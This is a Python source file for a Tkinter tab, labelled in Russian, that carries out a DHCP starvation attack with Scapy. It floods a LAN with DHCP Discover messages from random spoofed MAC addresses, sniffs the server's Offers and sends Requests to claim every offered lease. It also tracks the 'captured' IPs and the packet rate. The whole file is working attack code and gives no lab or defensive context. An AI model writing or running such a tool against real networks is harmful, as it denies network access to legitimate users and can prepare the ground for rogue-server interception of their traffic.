"""DHCP starvation tab."""
import time
import socket
import struct
import random
import threading
import tkinter as tk
from tkinter import ttk, scrolledtext

from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, UDP
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.sendrecv import sendp, sniff

class DhcpTabMixin:
    # -------------------- DHCP Starvation (без изменений) --------------------
    def setup_dhcp_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)
        params_frame = ttk.LabelFrame(left_frame, text="Параметры DHCP Starvation")
        params_frame.pack(fill='x', padx=5, pady=5)
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=5, pady=5)
        ttk.Label(row1, text="Интерфейс:", width=12).pack(side='left', padx=2)
        self.dhcp_interface = ttk.Combobox(row1, width=25, font=('Arial', 9), values=self.network_interfaces)
        self.dhcp_interface.pack(side='left', padx=2)
        self.dhcp_interface.set(self.active_interface)
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=5, pady=5)
        ttk.Label(row2, text="Размер пула:", width=12).pack(side='left', padx=2)
        self.dhcp_pool_size = ttk.Entry(row2, width=10, font=('Arial', 9))
        self.dhcp_pool_size.pack(side='left', padx=2)
        self.dhcp_pool_size.insert(0, "254")
        row3 = ttk.Frame(params_frame)
        row3.pack(fill='x', padx=5, pady=5)
        ttk.Label(row3, text="Кол-во запросов:", width=12).pack(side='left', padx=2)
        self.dhcp_request_count = ttk.Entry(row3, width=10, font=('Arial', 9))
        self.dhcp_request_count.pack(side='left', padx=2)
        self.dhcp_request_count.insert(0, "1000")
        row4 = ttk.Frame(params_frame)
        row4.pack(fill='x', padx=5, pady=5)
        ttk.Label(row4, text="Задержка (сек):", width=12).pack(side='left', padx=2)
        self.dhcp_delay = ttk.Entry(row4, width=10, font=('Arial', 9))
        self.dhcp_delay.pack(side='left', padx=2)
        self.dhcp_delay.insert(0, "0.05")
        row5 = ttk.Frame(params_frame)
        row5.pack(fill='x', padx=5, pady=5)
        ttk.Label(row5, text="Таймаут Offer (сек):", width=18).pack(side='left', padx=2)
        self.dhcp_offer_timeout = ttk.Entry(row5, width=10, font=('Arial', 9))
        self.dhcp_offer_timeout.pack(side='left', padx=2)
        self.dhcp_offer_timeout.insert(0, "3")
        row6 = ttk.Frame(params_frame)
        row6.pack(fill='x', padx=5, pady=5)
        ttk.Label(row6, text="Таймаут ACK (сек):", width=18).pack(side='left', padx=2)
        self.dhcp_ack_timeout = ttk.Entry(row6, width=10, font=('Arial', 9))
        self.dhcp_ack_timeout.pack(side='left', padx=2)
        self.dhcp_ack_timeout.insert(0, "3")
        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=5, pady=10)
        self.dhcp_start_btn = ttk.Button(
            button_frame, text="Начать DHCP Starvation",
            command=self.start_dhcp_attack, width=20,
        )
        self.dhcp_start_btn.pack(side='left', padx=5)
        self.dhcp_stop_btn = ttk.Button(button_frame, text="Остановить", 
                                      command=self.stop_dhcp_attack, width=15, state='disabled')
        self.dhcp_stop_btn.pack(side='left', padx=5)
        stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
        stats_frame.pack(fill='x', padx=5, pady=5)
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', padx=5, pady=5)
        ttk.Label(stats_grid, text="Отправлено пакетов:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.dhcp_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.dhcp_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Скорость (pps):", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.dhcp_rate = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.dhcp_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Уникальных MAC:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
        self.dhcp_unique = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.dhcp_unique.grid(row=2, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=3, column=0, padx=5, pady=2, sticky='w')
        self.dhcp_time = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
        self.dhcp_time.grid(row=3, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Захваченные IP:", width=20, anchor='w').grid(row=4, column=0, padx=5, pady=2, sticky='w')
        self.dhcp_offered_label = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.dhcp_offered_label.grid(row=4, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Offers / ACKs:", width=20, anchor='w').grid(row=5, column=0, padx=5, pady=2, sticky='w')
        self.dhcp_offer_ack_label = ttk.Label(stats_grid, text="0 / 0", width=15, anchor='w')
        self.dhcp_offer_ack_label.grid(row=5, column=1, padx=5, pady=2, sticky='w')
        log_frame = ttk.LabelFrame(right_frame, text="Лог DHCP Starvation")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        self.dhcp_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
        self.dhcp_log.pack(fill='both', expand=True, padx=5, pady=5)
        btn_frame = ttk.Frame(log_frame)
        btn_frame.pack(fill='x', padx=5, pady=5)
        ttk.Button(btn_frame, text="Сохранить лог", 
                  command=lambda: self.save_log(self.dhcp_log), width=14).pack()
        self.dhcp_stats = {
            'start_time': 0,
            'sent_packets': 0,
            'unique_macs': set(),
            'last_update': 0,
            'last_sent': 0
        }
        self.dhcp_offered_ips = set()
        self.dhcp_offers = {}
        self.dhcp_lock = threading.Lock()
        self.dhcp_sniff_stop = None
        self.dhcp_sniff_thread = None

    def start_dhcp_attack(self):
        self.dhcp_attack_running = True
        self.dhcp_start_btn.config(state='disabled')
        self.dhcp_stop_btn.config(state='normal')
        try:
            pool_size = int(self.dhcp_pool_size.get())
            request_count = int(self.dhcp_request_count.get())
            delay = float(self.dhcp_delay.get())
            offer_timeout = int(self.dhcp_offer_timeout.get())
            ack_timeout = int(self.dhcp_ack_timeout.get())
        except Exception as e:
            print(f"[Gotcha] error: {e}")
            pool_size = 254
            request_count = 1000
            delay = 0.005
            offer_timeout = 30
            ack_timeout = 5
        self.dhcp_stats = {
            'start_time': time.time(),
            'sent_packets': 0,
            'unique_macs': set(),
            'last_update': time.time(),
            'last_sent': 0
        }
        with self.dhcp_lock:
            self.dhcp_offered_ips.clear()
            self.dhcp_offers.clear()
            self.dhcp_ack_xids = set()
            self.dhcp_server_by_xid = {}
        self.dhcp_sniff_stop = threading.Event()
        self.dhcp_sniff_thread = threading.Thread(target=self.dhcp_sniff_worker, args=(self.dhcp_interface.get(),))
        self.dhcp_sniff_thread.daemon = True
        self.dhcp_sniff_thread.start()
        self.dhcp_thread = threading.Thread(
            target=self.dhcp_attack_worker,
            args=(self.dhcp_interface.get(), pool_size, request_count, delay, offer_timeout, ack_timeout)
        )
        self.dhcp_thread.daemon = True
        self.dhcp_thread.start()
        self.update_dhcp_stats()
        self.dhcp_log.insert('end', f"DHCP Starvation started (pool size: {pool_size} IPs)\n")
        self.dhcp_log.insert('end', f"Interface: {self.dhcp_interface.get()}\n")
        self.status_var.set("DHCP Starvation запущена")

    @staticmethod
    def _bootp_yiaddr_str(yiaddr):
        """Scapy yiaddr → 'a.b.c.d' или ''."""
        if yiaddr is None:
            return ""
        if isinstance(yiaddr, str):
            s = yiaddr.strip()
            if not s or s.startswith("0.0.0.0"):
                return ""
            # только IPv4-вид
            parts = s.split(".")
            if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                return s
            return ""
        if isinstance(yiaddr, (bytes, bytearray)) and len(yiaddr) >= 4:
            try:
                return socket.inet_ntoa(bytes(yiaddr[:4]))
            except Exception:
                return ""
        if isinstance(yiaddr, int):
            if yiaddr == 0:
                return ""
            try:
                return socket.inet_ntoa(struct.pack("!I", yiaddr & 0xFFFFFFFF))
            except Exception:
                return ""
        # Scapy иногда отдаёт свой тип — пробуем str
        try:
            s = str(yiaddr).strip()
            parts = s.split(".")
            if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                if s != "0.0.0.0":
                    return s
        except Exception:
            pass
        return ""

    @staticmethod
    def _dhcp_message_type(pkt):
        """1 discover / 2 offer / 3 request / 5 ack — int или str от Scapy."""
        if DHCP not in pkt:
            return None
        for opt in pkt[DHCP].options:
            if not isinstance(opt, tuple) or len(opt) < 2:
                continue
            key = opt[0]
            if key not in ("message-type", b"message-type"):
                continue
            v = opt[1]
            if isinstance(v, int):
                return v
            if isinstance(v, bytes):
                try:
                    return v[0]
                except Exception:
                    return None
            if isinstance(v, str):
                m = {
                    "discover": 1, "offer": 2, "request": 3,
                    "decline": 4, "ack": 5, "nak": 6,
                    "release": 7, "inform": 8,
                }
                return m.get(v.lower())
            try:
                return int(v)
            except Exception:
                return None
        return None

    def _ip_from_dhcp_packet(self, pkt):
        """yiaddr, иначе option requested_addr."""
        if BOOTP not in pkt:
            return ""
        ip = self._bootp_yiaddr_str(pkt[BOOTP].yiaddr)
        if ip:
            return ip
        if DHCP in pkt:
            for opt in pkt[DHCP].options:
                if isinstance(opt, tuple) and len(opt) >= 2 and opt[0] in (
                    "requested_addr", "subnet_mask",
                ):
                    if opt[0] == "requested_addr":
                        return self._bootp_yiaddr_str(opt[1])
        return ""

    def _dhcp_log(self, text):
        def _do():
            try:
                self.dhcp_log.insert("end", text)
                self.dhcp_log.see("end")
            except Exception:
                pass
        try:
            self.root.after(0, _do)
        except Exception:
            pass

    def dhcp_sniff_worker(self, iface):
        def handle_packet(pkt):
            if not self.dhcp_attack_running:
                return
            if DHCP not in pkt or BOOTP not in pkt:
                return
            msg_type = self._dhcp_message_type(pkt)
            if msg_type == 2:  # OFFER
                try:
                    xid = int(pkt[BOOTP].xid) & 0xFFFFFFFF
                    offered_ip = self._ip_from_dhcp_packet(pkt)
                    if not offered_ip:
                        return
                    now = time.time()
                    if xid in self.last_offer_time and (now - self.last_offer_time[xid]) < 0.15:
                        return
                    self.last_offer_time[xid] = now
                    server_ip = ""
                    try:
                        server_ip = self._bootp_yiaddr_str(pkt[BOOTP].siaddr)
                    except Exception:
                        pass
                    if not server_ip and DHCP in pkt:
                        for opt in pkt[DHCP].options:
                            if isinstance(opt, tuple) and opt[0] in ("server_id", "server-id"):
                                server_ip = self._bootp_yiaddr_str(opt[1])
                                break
                    with self.dhcp_lock:
                        self.dhcp_offers[xid] = offered_ip
                        if server_ip:
                            self.dhcp_server_by_xid[xid] = server_ip
                    self._dhcp_log(f"[OFFER] IP {offered_ip} xid {xid}" + (f" server={server_ip}" if server_ip else "") + "\n")
                except Exception as e:
                    print(f"[Gotcha] offer: {e}")
            elif msg_type == 5:  # ACK
                try:
                    xid = int(pkt[BOOTP].xid) & 0xFFFFFFFF
                    ip = self._ip_from_dhcp_packet(pkt)
                    if not ip:
                        # fallback: если ACK без yiaddr — взять pending offer по xid
                        with self.dhcp_lock:
                            ip = self.dhcp_offers.get(xid, "")
                    if not ip:
                        return
                    now = time.time()
                    if xid in self.last_ack_time and (now - self.last_ack_time[xid]) < 0.15:
                        return
                    self.last_ack_time[xid] = now
                    with self.dhcp_lock:
                        self.dhcp_offered_ips.add(ip)
                        self.dhcp_ack_xids.add(xid)
                    self._dhcp_log(f"[ACK] IP {ip} xid {xid}\n")
                except Exception as e:
                    print(f"[Gotcha] ack: {e}")

        sniff(
            iface=iface,
            filter="udp port 67 or udp port 68",
            prn=handle_packet,
            stop_filter=lambda x: not self.dhcp_attack_running,
            store=0,
        )

    def stop_dhcp_attack(self):
        was_running = self.dhcp_attack_running
        self.dhcp_attack_running = False
        try:
            self.dhcp_start_btn.config(state="normal")
            self.dhcp_stop_btn.config(state="disabled")
        except Exception:
            pass
        if self.dhcp_sniff_stop:
            self.dhcp_sniff_stop.set()
        # Не join worker-а из самого worker-а — только из UI
        if threading.current_thread() is not getattr(self, "dhcp_thread", None):
            if self.dhcp_sniff_thread and self.dhcp_sniff_thread.is_alive():
                self.dhcp_sniff_thread.join(timeout=2.0)
            if getattr(self, "dhcp_thread", None) and self.dhcp_thread.is_alive():
                self.dhcp_thread.join(timeout=1.0)
        if not was_running and self.dhcp_stats.get("start_time", 0) == 0:
            return
        total_time = time.time() - self.dhcp_stats.get("start_time", time.time())
        total_packets = self.dhcp_stats.get("sent_packets", 0)
        total_bytes = total_packets * 590
        self._dhcp_log("\n--- Results ---\n")
        self._dhcp_log(f"Total packets sent: {total_packets}\n")
        self._dhcp_log(f"Unique MACs: {len(self.dhcp_stats.get('unique_macs', []))}\n")
        with self.dhcp_lock:
            if self.dhcp_offered_ips:
                self._dhcp_log("\n--- Захваченные IP (DHCP ACK) ---\n")
                for ip in sorted(self.dhcp_offered_ips):
                    self._dhcp_log(f"{ip}\n")
        self._dhcp_log(f"Duration: {total_time*1000:.0f} ms\n")
        if total_time > 0:
            self._dhcp_log(f"Avg rate: {int(total_packets/total_time)} pps\n")
        self._dhcp_log(f"Total data: {total_bytes} bytes\n")
        if total_time > 0:
            self._dhcp_log(f"Throughput: {(total_bytes*8/total_time/1e6):.2f} Mbps\n")
        try:
            self.status_var.set("DHCP Starvation остановлена")
        except Exception:
            pass

    def update_dhcp_stats(self):
        if not self.dhcp_attack_running:
            return
        current_time = time.time()
        duration = current_time - self.dhcp_stats['start_time']
        time_diff = current_time - self.dhcp_stats['last_update']
        if time_diff >= 1:
            packets_sent = self.dhcp_stats['sent_packets'] - self.dhcp_stats.get('last_sent', 0)
            current_rate = packets_sent / time_diff if time_diff > 0 else 0
            self.dhcp_rate.config(text=f"{int(current_rate)}")
            self.dhcp_stats['last_update'] = current_time
            self.dhcp_stats['last_sent'] = self.dhcp_stats['sent_packets']
        self.dhcp_sent.config(text=str(self.dhcp_stats['sent_packets']))
        self.dhcp_unique.config(text=str(len(self.dhcp_stats['unique_macs'])))
        with self.dhcp_lock:
            self.dhcp_offered_label.config(text=str(len(self.dhcp_offered_ips)))
            if hasattr(self, "dhcp_offer_ack_label"):
                n_off = len(self.dhcp_offers) + len(self.dhcp_offered_ips)
                n_ack = len(getattr(self, "dhcp_ack_xids", set()))
                self.dhcp_offer_ack_label.config(text=f"{n_off} / {n_ack}")
        hours = int(duration // 3600)
        minutes = int((duration % 3600) // 60)
        seconds = int(duration % 60)
        self.dhcp_time.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        if self.dhcp_attack_running:
            self.root.after(1000, self.update_dhcp_stats)

    def dhcp_attack_worker(self, interface, pool_size, request_count, delay, offer_timeout, ack_timeout):
        """Discover → короткий wait Offer → Request → короткий wait ACK.
        offer/ack timeout по умолчанию 2с (не 30) — иначе атака «встаёт»."""
        try:
            # Разумные пределы: UI может вписать 30, но режем сверху для скорости
            offer_timeout = max(0.2, min(float(offer_timeout), 5.0))
            ack_timeout = max(0.2, min(float(ack_timeout), 5.0))
            packet_count = 0
            used_macs = set()
            discovers_done = 0
            while self.dhcp_attack_running and discovers_done < request_count:
                mac = self.generate_random_mac()
                if mac in used_macs:
                    continue
                used_macs.add(mac)
                self.dhcp_stats["unique_macs"].add(mac)
                mac_bytes = bytes.fromhex(mac.replace(":", ""))
                xid = random.randint(1, 0xFFFFFFFF) & 0xFFFFFFFF
                dhcp_discover = (
                    Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
                    / IP(src="0.0.0.0", dst="255.255.255.255")
                    / UDP(sport=68, dport=67)
                    / BOOTP(chaddr=mac_bytes, xid=xid)
                    / DHCP(options=[("message-type", "discover"), "end"])
                )
                sendp(dhcp_discover, iface=interface, verbose=0)
                packet_count += 1
                discovers_done += 1
                self.dhcp_stats["sent_packets"] = packet_count

                offered_ip = None
                offer_deadline = time.time() + offer_timeout
                while time.time() < offer_deadline and self.dhcp_attack_running:
                    with self.dhcp_lock:
                        if xid in self.dhcp_offers:
                            offered_ip = self.dhcp_offers.pop(xid)
                            break
                    time.sleep(0.05)

                if offered_ip:
                    with self.dhcp_lock:
                        server_id = self.dhcp_server_by_xid.get(xid)
                    req_opts = [
                        ("message-type", "request"),
                        ("requested_addr", offered_ip),
                    ]
                    if server_id:
                        req_opts.append(("server_id", server_id))
                    req_opts.append("end")
                    dhcp_request = (
                        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
                        / IP(src="0.0.0.0", dst="255.255.255.255")
                        / UDP(sport=68, dport=67)
                        / BOOTP(chaddr=mac_bytes, xid=xid)
                        / DHCP(options=req_opts)
                    )
                    sendp(dhcp_request, iface=interface, verbose=0)
                    packet_count += 1
                    self.dhcp_stats["sent_packets"] = packet_count

                    ack_deadline = time.time() + ack_timeout
                    ack_received = False
                    while time.time() < ack_deadline and self.dhcp_attack_running:
                        with self.dhcp_lock:
                            if xid in self.dhcp_ack_xids or offered_ip in self.dhcp_offered_ips:
                                ack_received = True
                                break
                        time.sleep(0.05)
                    if ack_received:
                        self._dhcp_log(f"[CAPTURED] IP {offered_ip} (ACK)\n")
                    else:
                        self._dhcp_log(
                            f"[WARN] нет ACK для {offered_ip} ({ack_timeout}s)\n"
                        )
                # нет offer — сразу следующий Discover (не ждём 30с)

                if delay > 0:
                    time.sleep(delay)
                if len(used_macs) >= pool_size:
                    used_macs.clear()
                    time.sleep(0.2)

            # Авто-стоп по завершению лимита запросов
            if self.dhcp_attack_running:
                self.root.after(0, self.stop_dhcp_attack)
        except Exception as e:
            self._dhcp_log(f"DHCP Starvation error: {str(e)}\n")
            try:
                self.root.after(0, self.stop_dhcp_attack)
            except Exception:
                self.dhcp_attack_running = False

